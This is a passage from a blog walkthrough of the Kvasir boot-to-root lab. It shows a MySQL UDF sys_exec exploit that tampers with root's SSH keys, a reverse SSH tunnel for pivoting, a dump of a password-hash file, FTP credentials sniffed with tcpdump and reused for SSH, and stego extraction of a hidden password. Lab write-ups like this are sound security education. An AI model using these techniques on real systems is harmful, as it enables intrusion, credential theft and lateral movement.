</span><span class='line'>mv payload2 payload
</span><span class='line'>
</span><span class='line'>mysql -h 127.0.0.1 -P <span class="m">13333</span> -u root -pcoolwater &lt; payload
</span></code></pre></td></tr></table></div></figure>


<p><code>lib_mysql_udf</code> was compiled like so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>git clone https://github.com/mysqludf/lib_mysqludf_sys
</span><span class='line'><span class="nv">$ </span>gcc -fPIC -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o ./lib_mysqludf_sys.so
</span></code></pre></td></tr></table></div></figure>


<p>The exploit uses <code>INTO DUMPFILE</code> and not <code>INTO OUTFILE</code> because the latter mangled the file. Running the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tools/lib_mysqludf_sys<span class="nv">$ </span>bash ./exploit.sh
</span><span class='line'>sys_exec<span class="o">(</span><span class="s2">&quot;chmod 600 /root/.ssh/authorized_keys&quot;</span><span class="o">)</span>
</span><span class='line'>0
</span></code></pre></td></tr></table></div></figure>


<p>Sweet. I should now be able to login via ssh. Enabling the ssh tunnel on <code>192.168.1.100</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>ssh -fN -R 2222:192.168.2.200:22 bas@10.8.7.1 -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no -i /tmp/bas 2&gt;<span class="p">&amp;</span>1
</span></code></pre></td></tr></table></div></figure>


<p>And then on my own box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>ssh root@localhost -p 2222
</span><span class='line'>The authenticity of host <span class="s1">&#39;[localhost]:2222 ([127.0.0.1]:2222)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">ECDSA key fingerprint is 28:a1:7b:9c:cb:bc:aa:23:02:e1:e8:29:a0:c0:31:b8.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span><span class="o">[</span>localhost<span class="o">]</span>:2222<span class="err">&#39;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
</span><span class='line'>Linux db 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sat Sep <span class="m">27</span> 21:23:54 2014
</span><span class='line'>root@db:~#
</span></code></pre></td></tr></table></div></figure>


<p>Success! But this isn&rsquo;t the end of Kvasir, not by a long shot&hellip;</p>

<p><img src="http://barrebas.github.io/assets/kvasir/05.jpg" alt="" /></p>

<p>Enumerating the home directory shows <code>.words.txt</code>, which is needed later. Obviously, <code>flag</code> is a troll :]</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# ls -alh
</span><span class='line'>total 32K
</span><span class='line'>drwx------  <span class="m">4</span> root root 4.0K Sep <span class="m">27</span> 21:24 .
</span><span class='line'>drwxr-xr-x <span class="m">22</span> root root 4.0K Aug  <span class="m">9</span> 15:38 ..
</span><span class='line'>drwx------  <span class="m">2</span> root root 4.0K Aug  <span class="m">9</span> 22:57 .aptitude
</span><span class='line'>-rw-------  <span class="m">1</span> root root    <span class="m">0</span> Sep <span class="m">27</span> 21:33 .bash_history
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root  <span class="m">570</span> Jan <span class="m">31</span>  <span class="m">2010</span> .bashrc
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root   <span class="m">46</span> Sep <span class="m">27</span> 21:24 flag
</span><span class='line'>-rw-------  <span class="m">1</span> root root    <span class="m">0</span> Sep  <span class="m">4</span> 13:30 .mysql_history
</span><span class='line'>-rw-------  <span class="m">1</span> root root    <span class="m">0</span> Sep <span class="m">27</span> 21:34 .nano_history
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root  <span class="m">140</span> Nov <span class="m">19</span>  <span class="m">2007</span> .profile
</span><span class='line'>drwxr-xr-x  <span class="m">2</span> root root 4.0K Nov  <span class="m">3</span> 19:21 .ssh
</span><span class='line'>-rw-------  <span class="m">1</span> root root    <span class="m">0</span> Sep <span class="m">27</span> 21:33 .viminfo
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root 1.1K Aug <span class="m">10</span> 11:09 .words.txt
</span><span class='line'>root@db:~# ifconfig
</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 1e:13:fc:ff:a9:6a
</span><span class='line'>          inet addr:192.168.2.200  Bcast:192.168.2.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::1c13:fcff:feff:a96a/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:614 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:413 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000
</span><span class='line'>          RX bytes:81688 <span class="o">(</span>79.7 KiB<span class="o">)</span>  TX bytes:54254 <span class="o">(</span>52.9 KiB<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>eth1      Link encap:Ethernet  HWaddr ba:f4:f7:a6:a2:35
</span><span class='line'>          inet addr:192.168.3.200  Bcast:192.168.3.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::b8f4:f7ff:fea6:a235/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:262 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:168 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000
</span><span class='line'>          RX bytes:32269 <span class="o">(</span>31.5 KiB<span class="o">)</span>  TX bytes:32485 <span class="o">(</span>31.7 KiB<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Again, another NIC. Also, pure-ftpd is running on this box. After playing around, I found this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# cat /etc/pure-ftpd/pureftpd.passwd
</span><span class='line'>celes:<span class="nv">$1$LwZNkFH0$8rq4AbiYLXkfSMPXB1psV</span>/:1000:1000::/var/log/./::::::::::::
</span></code></pre></td></tr></table></div></figure>


<p>But the hash seems uncrackable. So there is a valid user to log into this pure-ftpd server, but <code>celes</code> is not a user on this box&hellip; So maybe a user from another box?! I ran tcpdump and whadda-ya-know:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# tcpdump -i eth1 -vvv -A
</span><span class='line'>tcpdump: listening on eth1, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size <span class="m">65535</span> bytes
</span><span class='line'>19:33:01.238481 IP <span class="o">(</span>tos 0x0, ttl 64, id 60394, offset 0, flags <span class="o">[</span>DF<span class="o">]</span>, proto TCP <span class="o">(</span>6<span class="o">)</span>, length 60<span class="o">)</span>
</span><span class='line'>    192.168.3.40.56746 &gt; 192.168.3.200.ftp: Flags <span class="o">[</span>S<span class="o">]</span>, cksum 0x64c5 <span class="o">(</span>correct<span class="o">)</span>, seq 1344587505, win 14600, options <span class="o">[</span>mss 1460,sackOK,TS val <span class="m">208155</span> ecr 0,nop,wscale 5<span class="o">]</span>, length 0
</span><span class='line'>E..&lt;..@.@......<span class="o">(</span>........P<span class="nv">$.</span>.......9.d..........
</span><span class='line'>..-.........
</span><span class='line'>19:33:01.238872 IP <span class="o">(</span>tos 0x0, ttl 64, id 0, offset 0, flags <span class="o">[</span>DF<span class="o">]</span>, proto TCP <span class="o">(</span>6<span class="o">)</span>, length 60<span class="o">)</span>
</span><span class='line'>    192.168.3.200.ftp &gt; 192.168.3.40.56746: Flags <span class="o">[</span>S.<span class="o">]</span>, cksum 0x886f <span class="o">(</span>incorrect -&gt; 0x70f4<span class="o">)</span>, seq 2494575209, ack 1344587506, win 14480, options <span class="o">[</span>mss 1460,sackOK,TS val <span class="m">208155</span> ecr 208155,nop,wscale 5<span class="o">]</span>, length 0
</span><span class='line'>E..&lt;..@.@..<span class="o">{</span>.......<span class="o">(</span>......2iP<span class="nv">$.</span>...8..o.........
</span><span class='line'>..-...-.....
</span><span class='line'>19:33:01.239764 IP <span class="o">(</span>tos 0x0, ttl 64, id 60395, offset 0, flags <span class="o">[</span>DF<span class="o">]</span>, proto TCP <span class="o">(</span>6<span class="o">)</span>, length 52<span class="o">)</span>
</span><span class='line'>    192.168.3.40.56746 &gt; 192.168.3.200.ftp: Flags <span class="o">[</span>.<span class="o">]</span>, cksum 0xd684 <span class="o">(</span>correct<span class="o">)</span>, seq 1, ack 1, win 457, options <span class="o">[</span>nop,nop,TS val <span class="m">208156</span> ecr 208155<span class="o">]</span>, length 0
</span><span class='line'>E..4..@.@......<span class="o">(</span>........P<span class="nv">$.</span>...2j...........
</span><span class='line'>..-...-.
</span><span class='line'>19:33:01.273258 IP <span class="o">(</span>tos 0x10, ttl 64, id 8054, offset 0, flags <span class="o">[</span>DF<span class="o">]</span>, proto TCP <span class="o">(</span>6<span class="o">)</span>, length 372<span class="o">)</span>
</span><span class='line'>    192.168.3.200.ftp &gt; 192.168.3.40.56746: Flags <span class="o">[</span>P.<span class="o">]</span>, cksum 0x6f1c <span class="o">(</span>correct<span class="o">)</span>, seq 1:321, ack 1, win 453, options <span class="o">[</span>nop,nop,TS val <span class="m">208164</span> ecr 208156<span class="o">]</span>, length 320
</span><span class='line'>E..t.v@.@..........<span class="o">(</span>......2jP<span class="nv">$.</span>.....o......
</span><span class='line'>..-<span class="nv">$.</span>.-.220---------- Welcome to Pure-FTPd <span class="o">[</span>privsep<span class="o">]</span> <span class="o">[</span>TLS<span class="o">]</span> ----------
</span><span class='line'>220-You are user number <span class="m">1</span> of <span class="m">50</span> allowed.
</span><span class='line'>220-Local <span class="nb">time </span>is now 19:33. Server port: 21.
</span><span class='line'>220-This is a private system - No anonymous login
</span><span class='line'>220-IPv6 connections are also welcome on this server.
</span><span class='line'><span class="m">220</span> You will be disconnected after <span class="m">15</span> minutes of inactivity.
</span><span class='line'>
</span><span class='line'>19:33:01.273631 IP <span class="o">(</span>tos 0x0, ttl 64, id 60396, offset 0, flags <span class="o">[</span>DF<span class="o">]</span>, proto TCP <span class="o">(</span>6<span class="o">)</span>, length 52<span class="o">)</span>
</span><span class='line'>    192.168.3.40.56746 &gt; 192.168.3.200.ftp: Flags <span class="o">[</span>.<span class="o">]</span>, cksum 0xd512 <span class="o">(</span>correct<span class="o">)</span>, seq 1, ack 321, win 490, options <span class="o">[</span>nop,nop,TS val <span class="m">208164</span> ecr 208164<span class="o">]</span>, length 0
</span><span class='line'>E..4..@.@......<span class="o">(</span>........P<span class="nv">$.</span>...3............
</span><span class='line'>..-<span class="nv">$.</span>.-<span class="err">$</span>
</span><span class='line'>19:33:01.273931 IP <span class="o">(</span>tos 0x0, ttl 64, id 60397, offset 0, flags <span class="o">[</span>DF<span class="o">]</span>, proto TCP <span class="o">(</span>6<span class="o">)</span>, length 64<span class="o">)</span>
</span><span class='line'>    192.168.3.40.56746 &gt; 192.168.3.200.ftp: Flags <span class="o">[</span>P.<span class="o">]</span>, cksum 0x420c <span class="o">(</span>correct<span class="o">)</span>, seq 1:13, ack 321, win 490, options <span class="o">[</span>nop,nop,TS val <span class="m">208164</span> ecr 208164<span class="o">]</span>, length 12
</span><span class='line'>E..@..@.@......<span class="o">(</span>........P<span class="nv">$.</span>...3.....B......
</span><span class='line'>..-<span class="nv">$.</span>.-<span class="nv">$USER</span> celes
</span><span class='line'>
</span><span class='line'>19:33:01.273972 IP <span class="o">(</span>tos 0x10, ttl 64, id 8055, offset 0, flags <span class="o">[</span>DF<span class="o">]</span>, proto TCP <span class="o">(</span>6<span class="o">)</span>, length 52<span class="o">)</span>
</span><span class='line'>    192.168.3.200.ftp &gt; 192.168.3.40.56746: Flags <span class="o">[</span>.<span class="o">]</span>, cksum 0x8867 <span class="o">(</span>incorrect -&gt; 0xd52b<span class="o">)</span>, seq 321, ack 13, win 453, options <span class="o">[</span>nop,nop,TS val <span class="m">208164</span> ecr 208164<span class="o">]</span>, length 0
</span><span class='line'>E..4.w@.@..........<span class="o">(</span>......3.P<span class="nv">$.</span>......g.....
</span><span class='line'>..-<span class="nv">$.</span>.-<span class="err">$</span>
</span><span class='line'>19:33:01.278689 IP <span class="o">(</span>tos 0x10, ttl 64, id 8056, offset 0, flags <span class="o">[</span>DF<span class="o">]</span>, proto TCP <span class="o">(</span>6<span class="o">)</span>, length 90<span class="o">)</span>
</span><span class='line'>    192.168.3.200.ftp &gt; 192.168.3.40.56746: Flags <span class="o">[</span>P.<span class="o">]</span>, cksum 0xd679 <span class="o">(</span>correct<span class="o">)</span>, seq 321:359, ack 13, win 453, options <span class="o">[</span>nop,nop,TS val <span class="m">208165</span> ecr 208164<span class="o">]</span>, length 38
</span><span class='line'>E..Z.x@.@..........<span class="o">(</span>......3.P<span class="nv">$.</span>......y.....
</span><span class='line'>..-%..-<span class="nv">$331</span> User celes OK. Password required
</span><span class='line'>
</span><span class='line'>19:33:01.278954 IP <span class="o">(</span>tos 0x0, ttl 64, id 60398, offset 0, flags <span class="o">[</span>DF<span class="o">]</span>, proto TCP <span class="o">(</span>6<span class="o">)</span>, length 71<span class="o">)</span>
</span><span class='line'>    192.168.3.40.56746 &gt; 192.168.3.200.ftp: Flags <span class="o">[</span>P.<span class="o">]</span>, cksum 0x3986 <span class="o">(</span>correct<span class="o">)</span>, seq 13:32, ack 359, win 490, options <span class="o">[</span>nop,nop,TS val <span class="m">208166</span> ecr 208165<span class="o">]</span>, length 19
</span><span class='line'>E..G..@.@......<span class="o">(</span>........P<span class="nv">$.</span>...3.....9......
</span><span class='line'>..-<span class="p">&amp;</span>..-%PASS im22BF4HXn01
</span></code></pre></td></tr></table></div></figure>


<p>What the heck? Someone, or <em>something</em>, is accessing the ftp server. This yields the credentials <code>celes:im22BF4HXn01</code>. Maybe there is some password re-use going on?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@db:~# ssh celes@192.168.3.40
</span><span class='line'>The authenticity of host <span class="s1">&#39;192.168.3.40 (192.168.3.40)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">ECDSA key fingerprint is 28:a1:7b:9c:cb:bc:aa:23:02:e1:e8:29:a0:c0:31:b8.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>192.168.3.40<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
</span><span class='line'><span class="s1">celes@192.168.3.40&#39;</span>s password:
</span><span class='line'>Linux dev1 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>You have mail.
</span><span class='line'>Last login: Thu Sep  <span class="m">4</span> 09:20:00 2014
</span><span class='line'>celes@dev1:~<span class="nv">$ </span>ls -al
</span><span class='line'>total 136
</span><span class='line'>drwxr-xr-x <span class="m">3</span> celes celes   <span class="m">4096</span> Sep  <span class="m">3</span> 22:16 .
</span><span class='line'>drwxr-xr-x <span class="m">3</span> root  root    <span class="m">4096</span> Aug  <span class="m">9</span> 23:20 ..
</span><span class='line'>-rw------- <span class="m">1</span> celes celes     <span class="m">14</span> Sep  <span class="m">4</span> 09:16 .bash_history
</span><span class='line'>-rw-r--r-- <span class="m">1</span> celes celes    <span class="m">220</span> Dec <span class="m">30</span>  <span class="m">2012</span> .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> celes celes   <span class="m">3392</span> Dec <span class="m">30</span>  <span class="m">2012</span> .bashrc
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> celes celes    <span class="m">178</span> Sep <span class="m">27</span> 21:29 getLogs.py
</span><span class='line'>-rw-r--r-- <span class="m">1</span> celes celes <span class="m">104613</span> Sep  <span class="m">3</span> 22:16 kvasir.png
</span><span class='line'>-rw-r--r-- <span class="m">1</span> celes celes    <span class="m">675</span> Dec <span class="m">30</span>  <span class="m">2012</span> .profile
</span><span class='line'>drwx------ <span class="m">2</span> celes celes   <span class="m">4096</span> Sep  <span class="m">3</span> 22:06 .ssh
</span><span class='line'>-rw------- <span class="m">1</span> celes celes      <span class="m">0</span> Sep <span class="m">27</span> 21:35 .viminfo
</span></code></pre></td></tr></table></div></figure>


<p>Aw yeah! Now I&rsquo;ve entered a third box&hellip; The ftp traffic comes from <code>getLogs.py</code>. Enumerating the box leads to this mail:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>celes@dev1:~<span class="nv">$ </span>cat /var/mail/celes
</span><span class='line'>Return-path: &lt;celes@localhost&gt;
</span><span class='line'>Received: from celes by localhost with <span class="nb">local</span> <span class="o">(</span>Exim 4.80<span class="o">)</span>
</span><span class='line'>  <span class="o">(</span>envelope-from &lt;celes@localhost&gt;<span class="o">)</span>
</span><span class='line'>  id 1XHczw-0000V2-8y
</span><span class='line'>  <span class="k">for</span> celes@127.0.0.1<span class="p">;</span> Wed, <span class="m">13</span> Aug <span class="m">2014</span> 19:10:08 +0100
</span><span class='line'>Date: Wed, <span class="m">13</span> Aug <span class="m">2014</span> 19:10:08 +0100
</span><span class='line'>To: celes@127.0.0.1
</span><span class='line'>Subject: Reminder
</span><span class='line'>User-Agent: Heirloom mailx 12.5 6/20/10
</span><span class='line'>MIME-Version: 1.0
</span><span class='line'>Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
</span><span class='line'>Content-Transfer-Encoding: 7bit
</span><span class='line'>Message-Id: &lt;E1XHczw-0000V2-8y@localhost&gt;
</span><span class='line'>From: celes@localhost
</span><span class='line'>
</span><span class='line'>Terra sent me kvasir.png and challenged me to solve the stupid little puzzle she has running on her machine... *sigh*
</span></code></pre></td></tr></table></div></figure>


<p>OK, let&rsquo;s have a close look at <code>kvasir.png</code>.</p>

<p><img src="http://barrebas.github.io/assets/kvasir/kvasir.png" alt="" /></p>

<p>Haha, loving the Stargate reference :) I smell stego! I tried a few programs, like <code>outguess</code> and <code>steghide</code>, but <code>stepic</code> did the trick:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp<span class="nv">$ </span>stepic -d -i kvasir.png
</span><span class='line'>89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec9054422304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae555e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88df9bb4ae0a3dc20000000049454e44ae426082
</span></code></pre></td></tr></table></div></figure>


<p>Huh? What&rsquo;s this then?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp<span class="nv">$ </span>stepic -d -i kvasir.png <span class="p">|</span> xxd -r -p &gt; new
</span><span class='line'>bas@tritonal:~/tmp<span class="nv">$ </span>file new
</span><span class='line'>new: PNG image data, <span class="m">290</span> x 290, 1-bit colormap, non-interlaced
</span></code></pre></td></tr></table></div></figure>


<p>PNG in a PNG. We need to go <em>deeper</em>&hellip;</p>

<p><img src="http://barrebas.github.io/assets/kvasir/06.png" alt="" /></p>

<p>Ah! This QR code decodes to <code>Nk9yY31hva8q</code>. Could this be terra&rsquo;s password? And where exactly is terra? I wrote a small python script to scan for other ip addresses and sure enough, it found <code>192.168.3.50</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>celes@dev1:~<span class="nv">$ </span>ssh terra@192.168.3.50
</span><span class='line'>The authenticity of host <span class="s1">&#39;192.168.3.50 (192.168.3.50)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">ECDSA key fingerprint is 28:a1:7b:9c:cb:bc:aa:23:02:e1:e8:29:a0:c0:31:b8.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>192.168.3.50<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
</span><span class='line'><span class="s1">terra@192.168.3.50&#39;</span>s password:
</span><span class='line'>Permission denied, please try again.
</span><span class='line'>terra@192.168.3.50<span class="s1">&#39;s password: </span>
</span><span class='line'><span class="s1">Permission denied, please try again.</span>
</span><span class='line'><span class="s1">terra@192.168.3.50&#39;</span>s password:
</span><span class='line'>
</span><span class='line'>celes@dev1:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>FAIL. That didn&rsquo;t work. But the mail said something about a game? I modified a small portscanner in python (taken from <a href="http://www.pythonforpentesting.com/2013/10/port-scanning-with-python.html">here and modified</a>):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">conn</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
</span><span class='line'>  <span class="k">try</span><span class="p">:</span>
</span><span class='line'>      <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="c"># TCP scan </span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">s</span>
</span><span class='line'>  <span class="k">except</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="bp">None</span>
</span><span class='line'>      
